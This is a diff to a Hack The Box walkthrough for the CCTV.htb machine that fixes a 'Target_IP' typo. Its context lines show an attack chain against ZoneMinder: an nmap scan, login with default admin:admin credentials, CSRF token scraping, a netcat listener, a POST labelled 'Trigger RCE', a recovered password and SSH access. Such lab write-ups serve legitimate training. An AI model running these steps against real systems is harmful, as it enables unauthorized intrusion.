@@ -1,6 +1,6 @@
 # CCTV.htb — Step-by-Step Walkthrough
 
-**Target IP:** <Tareget_IP>
+**Target IP:** <Target_IP>
 **Attacker IP:** <Your_IP_Address>
 **Difficulty:** Medium
 **Platform:** Hack The Box (Authorized Pentest)
@@ -12,7 +12,7 @@
 We begin with an Nmap scan to identify open ports and services.
 
 ```bash
-nmap -sC -sV -oN nmap_cctv.txt <Tareget_IP>
+nmap -sC -sV -oN nmap_cctv.txt <Target_IP>
 ```
 
 ### Results
@@ -25,7 +25,7 @@ Port 80: HTTP (Apache 2.4.58)
 Navigating to:
 
 ```
-http://<Tareget_IP>/
+http://<Target_IP>/
 ```
 
 Reveals a **ZoneMinder CCTV monitoring system** located at:
@@ -56,7 +56,7 @@ ZoneMinder enforces **CSRF protection**, so we must first authenticate and obtai
 
 ```bash
 # Capture login page CSRF token
-L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
+L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:<Target_IP> \
 "http://cctv.htb/zm/index.php?view=login" \
 | grep -oP "__csrf_magic' value=\"\K[^\"]+")
 ```
@@ -65,7 +65,7 @@ L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
 
 ```bash
 # Login as admin:admin
-curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
+curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<Target_IP> \
 -X POST "http://cctv.htb/zm/index.php" \
 --data-urlencode "view=login" \
 --data-urlencode "action=login" \
@@ -81,7 +81,7 @@ curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
 Once authenticated, we access the filter page to obtain a new CSRF token.
 
 ```bash
-CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:<Tareget_IP> \
+CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:<Target_IP> \
 "http://cctv.htb/zm/?view=filter" \
 | grep -oP "__csrf_magic' value=\"\K[^\"]+")
 
@@ -103,7 +103,7 @@ nc -lvnp 4444
 ### Trigger RCE
 
 ```bash
-curl -s -b cookies.txt --resolve cctv.htb:80:<Tareget_IP> -X POST \
+curl -s -b cookies.txt --resolve cctv.htb:80:<Target_IP> -X POST \
 "http://cctv.htb/zm/?view=filter&action=execute" \
 --data-urlencode "__csrf_magic=$CSRF" \
 --data-urlencode "filter[Name]=pwn" \
@@ -154,7 +154,7 @@ Password: opensesame
 Using the recovered credentials:
 
 ```bash
-ssh mark@<Tareget_IP>
+ssh mark@<Target_IP>
 ```
 
 ```
